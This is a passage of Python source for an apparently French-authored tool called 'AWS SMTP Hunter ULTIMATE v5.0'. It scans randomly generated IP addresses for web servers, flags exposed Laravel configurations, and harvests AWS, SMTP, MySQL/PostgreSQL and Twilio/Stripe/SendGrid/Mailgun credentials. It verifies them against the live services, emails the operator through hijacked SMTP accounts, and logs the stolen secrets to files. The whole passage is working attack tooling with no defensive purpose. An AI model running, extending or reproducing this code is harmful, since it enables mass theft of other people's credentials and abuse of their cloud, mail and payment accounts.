        return self.exploit_database_credentials_sync(ip, port, creds)

    def exploit_database_credentials_sync(self, ip, port, creds):
        """🗄️ Exploitation Database sync"""
        try:
            results = self.database_validator.test_database_credentials(creds)
            
            if results:
                self.stats['database_found'] += 1
                
                for db_type, db_info in results:
                    self.stats['database_working'] += 1
                    if db_type == 'mysql':
                        self.stats['mysql_working'] += 1
                    elif db_type == 'postgresql':
                        self.stats['postgresql_working'] += 1
                        
                # Sauvegarde
                self.save_database_credentials(ip, port, creds, results)
                
                return True
                
        except Exception as e:
            if self.debug:
                self.logger.error(f"Database exploitation error: {e}")
                
        return False

    async def exploit_api_credentials_async(self, ip, port, creds, api_type):
        """🔗 Exploitation API async"""
        # APIs sont généralement sync, déléguer
        return self.exploit_api_credentials_sync(ip, port, creds, api_type)

    def exploit_api_credentials_sync(self, ip, port, creds, api_type):
        """🔗 Exploitation API sync"""
        try:
            self.stats['api_found'] += 1
            
            success = False
            result = None
            
            if api_type == 'twilio':
                success, result = self.api_validator.test_twilio_api(creds)
                if success:
                    self.stats['twilio_working'] += 1
                    
            elif api_type == 'stripe':
                success, result = self.api_validator.test_stripe_api(creds)
                if success:
                    self.stats['stripe_working'] += 1
                    
            elif api_type == 'sendgrid':
                success, result = self.api_validator.test_sendgrid_api(creds)
                if success:
                    self.stats['sendgrid_working'] += 1
                    
            elif api_type == 'mailgun':
                success, result = self.api_validator.test_mailgun_api(creds)
                if success:
                    self.stats['mailgun_working'] += 1
                    
            if success:
                self.stats['api_working'] += 1
                
                # Sauvegarde
                self.save_api_credentials(ip, port, creds, api_type, result)
                
                return True
                
        except Exception as e:
            if self.debug:
                self.logger.error(f"API exploitation error: {e}")
                
        return False

    def prepare_smtp_config(self, smtp_type, credentials):
        """⚙️ Préparation configuration SMTP complète"""
        smtp_configs = {
            'sendgrid': {
                'host': 'smtp.sendgrid.net',
                'port': 587,
                'username': 'apikey',
                'password': credentials.get('SENDGRID_API_KEY', ''),
                'tls': True
            },
            'mailgun': {
                'host': 'smtp.mailgun.org',
                'port': 587,
                'username': credentials.get('MAILGUN_SMTP_LOGIN', ''),
                'password': credentials.get('MAILGUN_SMTP_PASSWORD', ''),
                'tls': True
            },
            'smtp': {
                'host': credentials.get('MAIL_HOST', credentials.get('SMTP_HOST', '')),
                'port': int(credentials.get('MAIL_PORT', credentials.get('SMTP_PORT', 587))),
                'username': credentials.get('MAIL_USERNAME', credentials.get('SMTP_USERNAME', '')),
                'password': credentials.get('MAIL_PASSWORD', credentials.get('SMTP_PASSWORD', '')),
                'tls': True
            }
        }
        
        config = smtp_configs.get(smtp_type, smtp_configs['smtp'])
        
        # Validation
        if not all([config.get('host'), config.get('username'), config.get('password')]):
            return None
            
        return config

    def test_smtp_connection(self, smtp_config):
        """📧 Test connexion SMTP avec retry"""
        try:
            host = smtp_config['host']
            port = smtp_config['port']
            username = smtp_config['username']
            password = smtp_config['password']
            use_tls = smtp_config.get('tls', True)
            
            # Connexion SMTP
            if port == 465:
                context = ssl.create_default_context()
                server = smtplib.SMTP_SSL(host, port, context=context, timeout=10)
            else:
                server = smtplib.SMTP(host, port, timeout=10)
                server.ehlo()
                if use_tls:
                    server.starttls()
                    server.ehlo()
                    
            # Test d'authentification
            server.login(username, password)
            server.quit()
            
            return True, {
                'host': host,
                'port': port,
                'username': username,
                'auth_status': 'SUCCESS',
                'tls': use_tls
            }
            
        except smtplib.SMTPAuthenticationError:
            return False, "Authentication failed"
        except Exception as e:
            return False, str(e)

    def send_test_email(self, smtp_config, source_ip):
        """📤 Envoi d'email de test"""
        try:
            host = smtp_config['host']
            port = smtp_config['port']
            username = smtp_config['username']
            password = smtp_config['password']
            use_tls = smtp_config.get('tls', True)
            
            # Connexion
            if port == 465:
                context = ssl.create_default_context()
                server = smtplib.SMTP_SSL(host, port, context=context, timeout=10)
            else:
                server = smtplib.SMTP(host, port, timeout=10)
                server.ehlo()
                if use_tls:
                    server.starttls()
                    server.ehlo()
                    
            server.login(username, password)
            
            # Création du message
            msg = MIMEMultipart()
            msg['From'] = username
            msg['To'] = self.test_email
            msg['Subject'] = f"🔥 SMTP Working - {host} from {source_ip}"
            
            body = f"""
🔥 SMTP CREDENTIALS VERIFIED AND WORKING! 🔥

Source IP: {source_ip}
SMTP Host: {host}:{port}
Username: {username}
TLS: {use_tls}
Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Scanner: AWS SMTP Hunter ULTIMATE v5.0

This email confirms that the SMTP credentials are VALID and WORKING!
You can use these credentials for email sending.
"""
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Envoi
            server.send_message(msg)
            server.quit()
            
            return True
            
        except Exception as e:
            if self.debug:
                self.logger.error(f"Email sending error: {e}")
            return False

    def save_aws_credentials(self, ip, port, credentials, identity):
        """💾 Sauvegarde credentials AWS"""
        try:
            with open(self.output_files['aws_credentials'], 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*100}\n")
                f.write(f"VERIFIED AWS CREDENTIALS\n")
                f.write(f"{'='*100}\n")
                f.write(f"Source: {ip}:{port}\n")
                f.write(f"Account ID: {identity.get('Account', 'Unknown')}\n")
                f.write(f"User ARN: {identity.get('Arn', 'Unknown')}\n")
                f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"\n[CREDENTIALS]\n")
                for key, value in credentials.items():
                    f.write(f"{key}: {value}\n")
                f.write(f"{'='*100}\n\n")
                f.flush()
        except Exception as e:
            self.logger.error(f"Error saving AWS credentials: {e}")

    def save_smtp_credentials(self, ip, port, credentials, smtp_type, result, email_sent):
        """💾 Sauvegarde credentials SMTP"""
        try:
            with open(self.output_files['smtp_credentials'], 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*80}\n")
                f.write(f"VERIFIED {smtp_type.upper()} CREDENTIALS\n")
                f.write(f"{'='*80}\n")
                f.write(f"Source: {ip}:{port}\n")
                f.write(f"SMTP Type: {smtp_type}\n")
                f.write(f"Email Sent: {'✅ YES' if email_sent else '❌ NO'}\n")
                f.write(f"Test Email: {self.test_email}\n")
                f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"\n[SMTP INFO]\n")
                for key, value in result.items():
                    f.write(f"{key}: {value}\n")
                f.write(f"\n[CREDENTIALS]\n")
                for key, value in credentials.items():
                    f.write(f"{key}: {value}\n")
                f.write(f"{'='*80}\n\n")
                f.flush()
        except Exception as e:
            self.logger.error(f"Error saving SMTP credentials: {e}")

    def save_database_credentials(self, ip, port, credentials, results):
        """💾 Sauvegarde credentials Database"""
        try:
            with open(self.output_files['database_credentials'], 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*80}\n")
                f.write(f"VERIFIED DATABASE CREDENTIALS\n")
                f.write(f"{'='*80}\n")
                f.write(f"Source: {ip}:{port}\n")
                f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                
                for db_type, db_info in results:
                    f.write(f"\n[{db_type.upper()} CONNECTION]\n")
                    for key, value in db_info.items():
                        if key == 'databases' and isinstance(value, list):
                            f.write(f"{key}: {', '.join(value)}\n")
                        else:
                            f.write(f"{key}: {value}\n")
                            
                f.write(f"\n[CREDENTIALS]\n")
                for key, value in credentials.items():
                    f.write(f"{key}: {value}\n")
                f.write(f"{'='*80}\n\n")
                f.flush()
        except Exception as e:
            self.logger.error(f"Error saving database credentials: {e}")

    def save_api_credentials(self, ip, port, credentials, api_type, result):
        """💾 Sauvegarde credentials API"""
        try:
            with open(self.output_files['api_credentials'], 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*80}\n")
                f.write(f"VERIFIED {api_type.upper()} API CREDENTIALS\n")
                f.write(f"{'='*80}\n")
                f.write(f"Source: {ip}:{port}\n")
                f.write(f"API Type: {api_type}\n")
                f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"\n[API INFO]\n")
                for key, value in result.items():
                    if isinstance(value, list):
                        f.write(f"{key}: {', '.join(map(str, value))}\n")
                    else:
                        f.write(f"{key}: {value}\n")
                f.write(f"\n[CREDENTIALS]\n")
                for key, value in credentials.items():
                    f.write(f"{key}: {value}\n")
                f.write(f"{'='*80}\n\n")
                f.flush()
        except Exception as e:
            self.logger.error(f"Error saving API credentials: {e}")

    def save_vulnerability_details(self, ip, port, results):
        """💾 Sauvegarde détails vulnérabilités"""
        try:
            with open(self.output_files['vulnerability_details'], 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*100}\n")
                f.write(f"VULNERABILITY ANALYSIS: {ip}:{port}\n")
                f.write(f"{'='*100}\n")
                f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Response Time: {results.get('response_time', 0):.2f}s\n")
                f.write(f"Frameworks: {', '.join(results.get('frameworks', []))}\n")
                f.write(f"Vulnerabilities: {', '.join(results.get('vulnerabilities', []))}\n")
                f.write(f"Exploited: {', '.join(results.get('exploited', []))}\n")
                
                if results.get('laravel_info'):
                    laravel = results['laravel_info']
                    f.write(f"\n[LARAVEL DETECTED]\n")
                    f.write(f"Score: {laravel.get('score', 0)}\n")
                    f.write(f"ENV Exposed: {laravel.get('env_exposed', False)}\n")
                    f.write(f"Detection: {', '.join(laravel.get('detection_details', []))}\n")
                    
                if results.get('credentials'):
                    f.write(f"\n[CREDENTIALS FOUND]\n")
                    for cred_type, creds in results['credentials'].items():
                        if creds:
                            f.write(f"{cred_type.upper()}: {len(creds)} items\n")
                            
                if results.get('errors'):
                    f.write(f"\n[ERRORS]\n")
                    for error in results['errors']:
                        f.write(f"- {error}\n")
                        
                f.write(f"{'='*100}\n\n")
                f.flush()
        except Exception as e:
            self.logger.error(f"Error saving vulnerability details: {e}")

    def log_exploitation_success(self, ip, port, exploited_types):
        """📝 Log d'exploitation en temps réel"""
        try:
            with open(self.output_files['exploitation_log'], 'a', encoding='utf-8') as f:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"{timestamp} | {ip}:{port} | {', '.join(exploited_types)}\n")
                f.flush()
        except Exception as e:
            pass

    def save_valid_ips_batch(self, valid_ips):
        """💾 Sauvegarde batch IPs valides"""
        if not valid_ips:
            return
            
        try:
            with open(self.output_files['valid_ips'], 'a', encoding='utf-8') as f:
                for ip_port in valid_ips:
                    f.write(f"{ip_port}\n")
                f.flush()
        except Exception as e:
            self.logger.error(f"Error saving valid IPs: {e}")

    # ==================== WORKERS PRINCIPAUX ====================

    def ultra_fast_ip_generator_worker(self):
        """🎯 Worker générateur d'IPs ultra-rapide"""
        batch_size = max(1000, self.threads // 2)  # Adaptatif selon threads
        
        while self.running:
            try:
                # Génération adaptative
                if self.ip_queue.qsize() < batch_size:
                    ip_batch = self.ip_generator.generate_batch(batch_size)
                    self.stats['generated'] += len(ip_batch)
                    
                    # Injection dans la queue
                    for ip in ip_batch:
                        try:
                            self.ip_queue.put_nowait(ip)
                        except queue.Full:
                            break
                            
                    if self.debug:
                        self.logger.debug(f"Generated {len(ip_batch)} IPs, queue size: {self.ip_queue.qsize()}")
                else:
                    # Queue pleine, attendre
                    time.sleep(0.1)
                    
            except Exception as e:
                self.logger.error(f"IP generator error: {e}")
                time.sleep(1)

    def ultra_fast_ip_checker_worker(self):
        """⚡ Worker vérification IPs ultra-rapide"""
        local_valid_batch = []
        last_save = time.time()
        
        while self.running:
            try:
                # Traitement par batch
                ips_to_check = []
                for _ in range(20):  # Batch de 20
                    try:
                        ip = self.ip_queue.get_nowait()
                        ips_to_check.append(ip)
                    except queue.Empty:
                        break
                        
                if not ips_to_check:
                    time.sleep(0.01)
                    continue
                    
                # Vérification rapide
                for ip in ips_to_check:
                    self.stats['checked'] += 1
                    
                    # Adaptive delay
                    self.delay_manager.wait()
                    
                    # Test priorité HTTP puis HTTPS
                    if self.check_ip_ultra_fast(ip, 80):
                        local_valid_batch.append(f"{ip}:80")
                        self.stats['valid'] += 1
                        
                        try:
                            self.vuln_queue.put_nowait((ip, 80))
                        except queue.Full:
                            pass
                            
                        # Marquer comme productif
                        self.ip_generator.mark_productive_ip(ip, 1)
                        
                    elif self.check_ip_ultra_fast(ip, 443):
                        local_valid_batch.append(f"{ip}:443")
                        self.stats['valid'] += 1
                        
                        try:
                            self.vuln_queue.put_nowait((ip, 443))
                        except queue.Full:
                            pass
                            
                        # Marquer comme productif
                        self.ip_generator.mark_productive_ip(ip, 1)
                        
                # Sauvegarde périodique
                if len(local_valid_batch) >= 50 or time.time() - last_save > 30:
                    self.save_valid_ips_batch(local_valid_batch)
                    local_valid_batch = []
                    last_save = time.time()
                    
            except Exception as e:
                self.logger.error(f"IP checker error: {e}")
                time.sleep(0.1)

    def async_vulnerability_checker_worker(self):
        """🔍 Worker vérification vulnérabilités async"""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            loop.run_until_complete(self._async_vuln_worker_main())
        except Exception as e:
            self.logger.error(f"Async vuln worker error: {e}")
        finally:
            loop.close()

    async def _async_vuln_worker_main(self):
        """🔍 Main async vuln worker"""
        session = None
        
        try:
            if AIOHTTP_AVAILABLE:
                session = await self.session_manager.get_async_session()
                
            while self.running:
                # Traitement par batch
                items_to_check = []
                for _ in range(10):  # Batch plus petit pour async
                    try:
                        item = self.vuln_queue.get_nowait()
                        items_to_check.append(item)
                    except queue.Empty:
                        break
                        
                if not items_to_check:
                    await asyncio.sleep(0.01)
                    continue
                    
                # Traitement async
                tasks = []
                for ip, port in items_to_check:
                    task = self.check_vulnerability_async(ip, port, session)
                    tasks.append(task)
                    
                # Exécution parallèle
                if tasks:
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    for i, result in enumerate(results):
                        if isinstance(result, Exception):
                            continue
                            
                        ip, port = items_to_check[i]
                        
                        if result['vulnerabilities']:
                            self.stats['vulnerable'] += 1
                            
                            # Sauvegarde détaillée
                            self.save_vulnerability_details(ip, port, result)
                            
                            if result['exploited']:
                                self.stats['exploited'] += 1
                                self.log_exploitation_success(ip, port, result['exploited'])
                                print(f"[EXPLOIT] 🔥 {ip}:{port} - {', '.join(result['exploited'])}")
                                
        except Exception as e:
            self.logger.error(f"Async vuln worker main error: {e}")
        finally:
            if session:
                await session.close()

    def sync_vulnerability_checker_worker(self):
        """🔍 Worker vérification vulnérabilités sync (fallback)"""
        while self.running:
            try:
                # Traitement par batch
                items_to_check = []
                for _ in range(5):  # Batch plus petit pour sync
                    try:
                        item = self.vuln_queue.get_nowait()
                        items_to_check.append(item)
                    except queue.Empty:
                        break
                        
                if not items_to_check:
                    time.sleep(0.01)
                    continue
                    
                # Traitement sync
                for ip, port in items_to_check:
                    session = self.session_manager.get_session()
                    
                    try:
                        result = self.check_vulnerability_sync(ip, port, session)
                        
                        if result['vulnerabilities']:
                            self.stats['vulnerable'] += 1
                            
                            # Sauvegarde détaillée
                            self.save_vulnerability_details(ip, port, result)
                            
                            if result['exploited']:
                                self.stats['exploited'] += 1
                                self.log_exploitation_success(ip, port, result['exploited'])
                                print(f"[EXPLOIT] 🔥 {ip}:{port} - {', '.join(result['exploited'])}")
                                
                    except Exception as e:
                        if self.debug:
                            self.logger.error(f"Vuln check error for {ip}:{port}: {e}")
                    finally:
                        self.session_manager.return_session(session)
                        
            except Exception as e:
                self.logger.error(f"Sync vuln worker error: {e}")
                time.sleep(0.1)

    def advanced_performance_monitor_worker(self):
        """📊 Worker monitoring performance avancé"""
        while self.running:
            try:
                # Mise à jour des métriques système
                self.performance_monitor.update_metrics()
                
                # Mise à jour des stats
                self.stats['threads_active'] = threading.active_count()
                self.stats['queue_sizes'] = {
                    'ip_queue': self.ip_queue.qsize(),
                    'vuln_queue': self.vuln_queue.qsize(),
                    'validate_queue': self.validate_queue.qsize()
                }
                
                # Métriques système
                try:
                    memory = psutil.virtual_memory()
                    self.stats['memory_usage'] = memory.percent
                    self.stats['cpu_usage'] = psutil.cpu_percent()
                except:
                    pass
                    
                # Métriques de performance
                elapsed = time.time() - self.stats['start_time']
                if elapsed > 0:
                    self.stats['success_rate'] = self.stats['valid'] / max(1, self.stats['checked'])
                    
                # Adaptation automatique
                self.adaptive_performance_adjustment()
                
                time.sleep(5)  # Update toutes les 5 secondes
                
            except Exception as e:
                self.logger.error(f"Performance monitor error: {e}")
                time.sleep(10)

    def adaptive_performance_adjustment(self):
        """🔧 Ajustement adaptatif des performances"""
        try:
            # Analyser les métriques
            metrics = self.performance_monitor.get_average_metrics()
            
            # Ajustement des délais selon CPU
            if metrics['cpu_avg'] > 90:
                # CPU élevé - augmenter les délais
                self.delay_manager.current_delay = min(0.1, self.delay_manager.current_delay * 1.1)
            elif metrics['cpu_avg'] < 50:
                # CPU faible - réduire les délais
                self.delay_manager.current_delay = max(0.01, self.delay_manager.current_delay * 0.95)
                
            # Ajustement selon mémoire
            if metrics['memory_avg'] > 85:
                # Mémoire élevée - forcer garbage collection
                gc.collect()
                
                # Nettoyer les caches
                if len(self.ip_generator.used_ips) > 50000:
                    recent_ips = list(self.ip_generator.used_ips)[-25000:]
                    self.ip_generator.used_ips = set(recent_ips)
                    
        except Exception as e:
            if self.debug:
                self.logger.error(f"Performance adjustment error: {e}")

    def intelligent_cleanup_worker(self):
        """🧹 Worker nettoyage intelligent"""
        while self.running:
            try:
                # Nettoyage toutes les 5 minutes
                time.sleep(300)
                
                # Garbage collection
                gc.collect()
                
                # Nettoyage des caches
                self.cleanup_caches()
                
                # Sauvegarde de l'intelligence
                self.ip_generator.save_intelligence()
                
                # Rotation des logs si trop gros
                self.rotate_logs_if_needed()
                
                if self.debug:
                    self.logger.debug("Cleanup completed")
                    
            except Exception as e:
                self.logger.error(f"Cleanup worker error: {e}")

    def cleanup_caches(self):
        """🧹 Nettoyage des caches"""
        try:
            # Cache IPs utilisées
            if len(self.ip_generator.used_ips) > 100000:
                recent_ips = list(self.ip_generator.used_ips)[-50000:]
                self.ip_generator.used_ips = set(recent_ips)
                
            # Cache SMTP testés
            if hasattr(self, 'smtp_validator') and len(self.smtp_validator.tested_smtp) > 10000:
                self.smtp_validator.tested_smtp.clear()
                
            # Cache AWS testés
            if len(self.aws_validator.tested_aws) > 5000:
                self.aws_validator.tested_aws.clear()
                
            # Cache Database testés
            if len(self.database_validator.tested_connections) > 5000:
                self.database_validator.tested_connections.clear()
                
            # Cache API testés
            if len(self.api_validator.tested_apis) > 5000:
                self.api_validator.tested_apis.clear()
                
        except Exception as e:
            if self.debug:
                self.logger.error(f"Cache cleanup error: {e}")

    def rotate_logs_if_needed(self):
        """📄 Rotation des logs si nécessaire"""
        try:
            for file_path in self.output_files.values():
                if os.path.exists(file_path):
                    size = os.path.getsize(file_path)
                    # Si > 100MB, faire une rotation
                    if size > 100 * 1024 * 1024:
                        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                        backup_path = f"{file_path}.{timestamp}"
                        os.rename(file_path, backup_path)
                        
        except Exception as e:
            if self.debug:
                self.logger.error(f"Log rotation error: {e}")

    def ultra_advanced_stats_display(self):
        """📊 Affichage stats ultra-avancé"""
        while self.running:
            try:
                time.sleep(10)  # Update toutes les 10 secondes
                
                # Clear screen
                os.system('cls' if os.name == 'nt' else 'clear')
                
                elapsed = time.time() - self.stats['start_time']
                rate = self.stats['checked'] / elapsed if elapsed > 0 else 0
                
                print(f"{'='*120}")
                print(f"🔥 AWS SMTP HUNTER ULTIMATE v5.0 - COMPLETE EDITION")
                print(f"🎯 TARGET: MAXIMUM PERFORMANCE WITH {self.threads} THREADS")
                print(f"{'='*120}")
                
                # Performance metrics
                print(f"⚡ PERFORMANCE METRICS:")
                print(f"   Current Speed:     {rate:,.0f} IPs/sec")
                print(f"   Target Speed:      150+ IPs/sec")
                print(f"   Success Rate:      {self.stats.get('success_rate', 0)*100:.1f}%")
                print(f"   Avg Response Time: {self.stats.get('avg_response_time', 0):.2f}s")
                print(f"   Adaptive Delay:    {self.delay_manager.current_delay:.3f}s")
                
                # System metrics
                print(f"\n🖥️ SYSTEM METRICS:")
                print(f"   CPU Usage:         {self.stats.get('cpu_usage', 0):.1f}%")
                print(f"   Memory Usage:      {self.stats.get('memory_usage', 0):.1f}%")
                print(f"   Active Threads:    {self.stats.get('threads_active', 0)}")
                print(f"   Uptime:            {elapsed/3600:.1f}h")
                
                # Scanning stats
                print(f"\n📊 SCANNING STATISTICS:")
                print(f"   IPs Generated:     {self.stats['generated']:,}")
                print(f"   IPs Checked:       {self.stats['checked']:,}")
                print(f"   IPs Valid:         {self.stats['valid']:,}")
                print(f"   IPs Vulnerable:    {self.stats['vulnerable']:,}")
                print(f"   IPs Exploited:     {self.stats['exploited']:,}")
                
                # Queue status
                queue_sizes = self.stats.get('queue_sizes', {})
                print(f"\n🔄 QUEUE STATUS:")
                print(f"   IP Queue:          {queue_sizes.get('ip_queue', 0):,}")
                print(f"   Vuln Queue:        {queue_sizes.get('vuln_queue', 0):,}")
                print(f"   Validate Queue:    {queue_sizes.get('validate_queue', 0):,}")
                
                # Exploitation results
                print(f"\n🔥 EXPLOITATION RESULTS:")
                print(f"   Laravel Found:     {self.stats['laravel_found']:,}")
                print(f"   AWS Found:         {self.stats['aws_found']:,}")
                print(f"   AWS Working:       {self.stats['aws_working']:,}")
                print(f"   SMTP Found:        {self.stats['smtp_found']:,}")
                print(f"   SMTP Working:      {self.stats['smtp_working']:,}")
                print(f"   Emails Sent:       {self.stats['emails_sent']:,}")
                print(f"   Database Found:    {self.stats['database_found']:,}")
                print(f"   Database Working:  {self.stats['database_working']:,}")
                print(f"   API Found:         {self.stats['api_found']:,}")
                print(f"   API Working:       {self.stats['api_working']:,}")
                
                # Framework detection
                if self.stats['frameworks_detected']:
                    print(f"\n🛠️ FRAMEWORKS DETECTED:")
                    fw_items = sorted(self.stats['frameworks_detected'].items(), key=lambda x: x[1], reverse=True)
                    for fw, count in fw_items[:8]:
                        print(f"   {fw:15} {count:,}")
                        
                # SMTP types working
                if self.stats['smtp_working_types']:
                    print(f"\n📧 SMTP TYPES WORKING:")
                    smtp_items = sorted(self.stats['smtp_working_types'].items(), key=lambda x: x[1], reverse=True)
                    for smtp_type, count in smtp_items[:6]:
                        print(f"   {smtp_type:15} {count:,}")
                        
                # Credentials found
                if self.stats['credentials_found']:
                    print(f"\n🔑 CREDENTIALS FOUND:")
                    cred_items = sorted(self.stats['credentials_found'].items(), key=lambda x: x[1], reverse=True)
                    for cred_type, count in cred_items[:8]:
                        success = self.stats['exploitation_success'].get(cred_type, 0)
                        attempts = self.stats['exploitation_attempts'].get(cred_type, 0)
                        success_rate = (success / attempts * 100) if attempts > 0 else 0
                        print(f"   {cred_type:12} {count:,} found | {success:,} working ({success_rate:.1f}%)")
                        
                print(f"\n📁 OUTPUT FILES:")
                for file_key, filename in self.output_files.items():
                    try:
                        size = os.path.getsize(filename) if os.path.exists(filename) else 0
                        print(f"   {filename:30} {size:,} bytes")
                    except:
                        print(f"   {filename:30} Error")
                        
                print(f"{'='*120}")
                
            except Exception as e:
                self.logger.error(f"Stats display error: {e}")
                time.sleep(5)

    def start_all_advanced_workers(self):
        """🚀 Démarrage de tous les workers avancés"""
        try:
            self.workers = []
            
            # 1. Générateur d'IPs (1 thread)
            ip_gen_worker = threading.Thread(target=self.ultra_fast_ip_generator_worker, daemon=True)
            ip_gen_worker.start()
            self.workers.append(ip_gen_worker)
            self.worker_stats['ip_generator'] = 1
            
            # 2. Vérificateurs d'IPs (60% des threads)
            ip_checker_count = max(1, int(self.threads * 0.6))
            for i in range(ip_checker_count):
                checker = threading.Thread(target=self.ultra_fast_ip_checker_worker, daemon=True)
                checker.start()
                self.workers.append(checker)
            self.worker_stats['ip_checkers'] = ip_checker_count
            
            # 3. Vérificateurs de vulnérabilités (25% des threads)
            vuln_checker_count = max(1, int(self.threads * 0.25))
            
            # Utiliser async si disponible, sinon sync
            for i in range(vuln_checker_count):
                if AIOHTTP_AVAILABLE and i < vuln_checker_count // 2:
                    # 50% async si disponible
                    vuln_checker = threading.Thread(target=self.async_vulnerability_checker_worker, daemon=True)
                else:
                    # 50% sync
                    vuln_checker = threading.Thread(target=self.sync_vulnerability_checker_worker, daemon=True)
                vuln_checker.start()
                self.workers.append(vuln_checker)
            self.worker_stats['vuln_checkers'] = vuln_checker_count
            
            # 4. Moniteur de performance (1 thread)
            perf_monitor = threading.Thread(target=self.advanced_performance_monitor_worker, daemon=True)
            perf_monitor.start()
            self.workers.append(perf_monitor)
            self.worker_stats['performance_monitor'] = 1
            
            # 5. Nettoyage intelligent (1 thread)
            cleanup_worker = threading.Thread(target=self.intelligent_cleanup_worker, daemon=True)
            cleanup_worker.start()
            self.workers.append(cleanup_worker)
            self.worker_stats['cleanup'] = 1
            
            # 6. Affichage des stats (1 thread)
            stats_worker = threading.Thread(target=self.ultra_advanced_stats_display, daemon=True)
            stats_worker.start()
            self.workers.append(stats_worker)
            self.worker_stats['stats_display'] = 1
            
            total_workers = sum(self.worker_stats.values())
            
            print(f"✅ {total_workers} ADVANCED WORKERS STARTED:")
            print(f"   📊 {self.worker_stats['ip_generator']} IP Generator")
            print(f"   ⚡ {self.worker_stats['ip_checkers']} IP Checkers (60%)")
            print(f"   🔍 {self.worker_stats['vuln_checkers']} Vuln Checkers (25%)")
            print(f"   📈 {self.worker_stats['performance_monitor']} Performance Monitor")
            print(f"   🧹 {self.worker_stats['cleanup']} Cleanup Worker")
            print(f"   📊 {self.worker_stats['stats_display']} Stats Display")
            print(f"🎯 CONFIGURED FOR {self.threads} THREADS MAXIMUM PERFORMANCE")
            
            if AIOHTTP_AVAILABLE:
                print("🚀 ASYNC MODE ENABLED for maximum performance")
            else:
                print("⚠️ SYNC MODE (install aiohttp for better performance)")
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error starting workers: {e}")
            return False

    def run_complete_scan(self):
        """🚀 Lancement du scan complet"""
        try:
            print("="*120)
            print("🔥 AWS SMTP HUNTER ULTIMATE v5.0 - COMPLETE EDITION")
            print("🎯 MAXIMUM PERFORMANCE CONFIGURATION")
            print("="*120)
            print(f"Mode: {self.mode}")
            print(f"Threads: {self.threads}")
            print(f"Test Email: {self.test_email}")
            print(f"Debug Mode: {self.debug}")
            print(f"Async Available: {AIOHTTP_AVAILABLE}")
            print(f"AWS Available: {BOTO3_AVAILABLE}")
            print(f"Database Tests: MySQL={MYSQL_AVAILABLE}, PostgreSQL={POSTGRES_AVAILABLE}")
            print(f"API Tests: Twilio={TWILIO_AVAILABLE}, Stripe={STRIPE_AVAILABLE}")
            print("="*120)
            
            # Démarrage des workers
            if not self.start_all_advanced_workers():
                print("❌ Failed to start workers")
                return
                
            print("🚀 COMPLETE SCAN STARTED!")
            print("📊 Real-time monitoring every 10 seconds")
            print("🔄 Adaptive performance adjustments enabled")
            print("🧹 Intelligent cleanup every 5 minutes")
            print("💾 Auto-save and intelligence learning enabled")
            print("⚡ Press Ctrl+C to stop gracefully")
            print("="*120)
            
            # Boucle principale
            while self.running:
                time.sleep(1)
                
                # Check workers health
                alive_workers = sum(1 for w in self.workers if w.is_alive())
                if alive_workers < len(self.workers) * 0.8:  # Si moins de 80% vivants
                    self.logger.warning(f"Only {alive_workers}/{len(self.workers)} workers alive")
                    
        except KeyboardInterrupt:
            print("\n🛑 Graceful shutdown requested...")
            self.stop_complete_scan()
        except Exception as e:
            print(f"\n❌ Critical error: {e}")
            self.logger.error(f"Critical error in main loop: {e}")
            self.stop_complete_scan()

    def stop_complete_scan(self):
        """🛑 Arrêt complet et graceful"""
        print("🛑 Stopping all workers...")
        self.running = False
        
        # Attendre que les workers finissent
        time.sleep(3)
        
        # Sauvegarde finale
        print("💾 Final save...")
        try:
            self.ip_generator.save_intelligence()
        except Exception as e:
            self.logger.error(f"Error saving intelligence: {e}")
            
        # Stats finales
        self.print_final_comprehensive_stats()
        
        print("✅ Scan stopped gracefully")

    def print_final_comprehensive_stats(self):
        """📊 Stats finales ultra-complètes"""
        elapsed = time.time() - self.stats['start_time']
        final_rate = self.stats['checked'] / elapsed if elapsed > 0 else 0
        
        print("\n" + "="*120)
        print("📊 FINAL COMPREHENSIVE STATISTICS")
        print("="*120)
        
        # Performance
        print(f"⚡ PERFORMANCE:")
        print(f"   Final Speed:        {final_rate:,.0f} IPs/sec")
        print(f"   Target Achievement: {'✅ SUCCESS' if final_rate >= 100 else '🔄 PARTIAL'}")
        print(f"   Total Runtime:      {elapsed/3600:.1f}h ({elapsed/60:.1f}min)")
        print(f"   Success Rate:       {self.stats.get('success_rate', 0)*100:.1f}%")
        
        # Volume stats
        print(f"\n📊 VOLUME STATISTICS:")
        print(f"   IPs Generated:      {self.stats['generated']:,}")
        print(f"   IPs Checked:        {self.stats['checked']:,}")
        print(f"   IPs Valid:          {self.stats['valid']:,}")
        print(f"   IPs Vulnerable:     {self.stats['vulnerable']:,}")
        print(f"   IPs Exploited:      {self.stats['exploited']:,}")
        print(f"   Efficiency:         {self.stats['valid']/max(1,self.stats['checked'])*100:.2f}%")
        
        # Exploitation summary
        print(f"\n🔥 EXPLOITATION SUMMARY:")
        print(f"   Laravel Sites:      {self.stats['laravel_found']:,}")
        print(f"   AWS Credentials:    {self.stats['aws_working']:,} working / {self.stats['aws_found']:,} found")
        print(f"   SMTP Credentials:   {self.stats['smtp_working']:,} working / {self.stats['smtp_found']:,} found")
        print(f"   Database Access:    {self.stats['database_working']:,} working / {self.stats['database_found']:,} found")
        print(f"   API Access:         {self.stats['api_working']:,} working / {self.stats['api_found']:,} found")
        print(f"   Emails Sent:        {self.stats['emails_sent']:,}")
        
        # Service breakdown
        if self.stats['aws_working'] > 0:
            print(f"\n☁️ AWS SERVICES:")
            print(f"   SES Ready:          {self.stats.get('aws_ses_ready', 0):,}")
